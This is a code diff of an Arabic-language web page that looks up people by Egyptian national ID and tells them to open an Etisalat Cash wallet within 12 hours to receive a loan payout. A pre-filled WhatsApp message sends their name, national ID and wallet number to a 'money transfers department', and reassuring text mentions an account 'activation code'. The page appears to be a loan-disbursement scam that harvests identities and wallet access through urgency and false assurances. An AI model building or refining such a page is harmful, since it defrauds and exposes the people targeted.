+          <button class="btn-whatsapp" onclick="openWhatsApp('السلام عليكم 👋\\n\\n👤 أنا: ${client.name}\\n🔢 الرقم القومي: ${client.id}\\n\\n📱 لقد قمت بفتح محفظة اتصالات كاش جديدة كما طُلب مني.\\n🔢 رقم اتصالات الجديد: [اكتب رقمك هنا]\\n\\n🎯 أرغب في إبلاغ قسم التحويلات المالية برقم اتصالات الخاص بي ليتم إضافته إلى ملفي على السيستم والبدء في إنهاء إجراءات التسيل والصرف.\\n\\n🙏 شكرًا.')">
+            <i class="fab fa-whatsapp fa-lg"></i> 📞 إبلاغ قسم التحويلات المالية برقم اتصالات
           </button>
         </div>
       </div>
@@ -460,7 +1718,7 @@
         <ul>
           <li><i class="fas fa-check"></i> <span>💰 لا نطلب أي رسوم مسبقة مقابل الصرف.</span></li>
           <li><i class="fas fa-check"></i> <span>🔑 كود التفعيل خاص بحسابك أنت فقط، ولا يُستخدم لأي غرض آخر.</span></li>
-          <li><i class="fas fa-check"></i> <span>✅ يمكنك التأكد من الكود عبر تطبيق المحفظة الرسمي قبل التنفيذ.</span></li>
+          <li><i class="fas fa-check"></i> <span>✅ يمكنك التأكد من الكود عبر تطبيق اتصالات الرسمي قبل التنفيذ.</span></li>
           <li><i class="fas fa-check"></i> <span>💬 لأي استفسار، تواصل معنا مباشرة عبر واتساب الرسمي.</span></li>
         </ul>
       </div>
@@ -471,11 +1729,13 @@
     currentClient = client;
     const resultArea = document.getElementById('resultArea');
     const totalDisplay = calculateTotal(client);
+
     let html = '';
     html += buildLoanCard(client, totalDisplay);
     html += buildIdVerification(client);
     html += buildClientDetails(client);
-    if (client.hasEtisalat === true || client.hasVodafone === true) {
+
+    if (client.hasEtisalat === true) {
       html += `
         <div class="status-bar info">
           <div class="status-icon"><i class="fas fa-circle-info"></i></div>
@@ -491,26 +1751,32 @@
         <div class="status-bar warning">
           <div class="status-icon"><i class="fas fa-triangle-exclamation"></i></div>
           <div class="status-text">
-            <div class="main">⚠️ مطلوب فتح محفظة كاش</div>
+            <div class="main">⚠️ مطلوب فتح محفظة اتصالات كاش</div>
             <div class="sub">⏰ خلال 12 ساعة من الآن لإتمام الصرف</div>
           </div>
         </div>
       `;
       html += buildOpenWalletBox(client);
     }
+
     html += buildTransparency();
+
     resultArea.innerHTML = html;
     document.getElementById('errorBox').style.display = 'none';
   }
 
+  // ===== البحث =====
   function searchCustomer(idFromURL) {
     const input = document.getElementById('nationalId');
     const nationalId = idFromURL || (input ? input.value.trim() : '');
+
     if (!nationalId) { alert('⚠️ الرجاء إدخال الرقم القومي'); return; }
     if (nationalId.length !== 14) { alert('⚠️ الرقم القومي يجب أن يكون 14 رقمًا'); return; }
+
     document.getElementById('loader').style.display = 'block';
     document.getElementById('resultArea').innerHTML = '';
     document.getElementById('errorBox').style.display = 'none';
+
     setTimeout(() => {
       document.getElementById('loader').style.display = 'none';
       const found = customersDatabase[nationalId];
@@ -524,6 +1790,7 @@
     }, 700);
   }
 
+  // ===== قراءة الرقم من الرابط عند فتح الصفحة (اختياري) =====
   window.addEventListener('load', () => {
     const urlParams = new URLSearchParams(window.location.search);
     const idFromURL = urlParams.get('id');
@@ -534,6 +1801,7 @@
     }
   });
 
+  // ===== الأحداث =====
   document.getElementById('nationalId')?.addEventListener('keypress', e => {
     if (e.key === 'Enter') searchCustomer();
   });
